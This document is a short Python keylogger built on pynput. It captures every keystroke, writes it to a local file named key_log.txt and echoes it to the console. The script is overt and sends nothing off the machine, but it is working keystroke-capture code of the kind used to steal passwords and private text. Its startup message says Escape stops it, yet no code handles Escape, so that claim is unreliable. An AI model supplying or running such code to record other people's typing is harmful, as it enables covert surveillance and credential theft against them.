from pynput.keyboard import Listener, Key
import os

# File to store logs
log_file = "key_log.txt"

def log_key(key):
    """Log keypresses to a file and display them in the console."""
    try:
        if hasattr(key, 'char') and key.char is not None:
            key_value = key.char  # Alphanumeric keys
            print(key_value, end='', flush=True)
        elif key == Key.space:
            key_value = ' '  # Space key
            print(key_value, end='', flush=True)
        elif key == Key.enter:
            key_value = '\n'  # Enter key
            print(key_value, end='', flush=True)
        else:
            key_value = f"[{key}]"  # Other keys
            print(key_value, end='', flush=True)
        
        # Write key to file
        with open(log_file, "a") as file:
            file.write(key_value)
    
    except Exception as e:
        print(f"\nError logging key: {e}")

def main():
    """Start the keylogger."""
    print("Keylogger started. Press 'Escape' to stop.")
    with Listener(on_press=log_key) as listener:
        listener.join()

if __name__ == "__main__":
    main()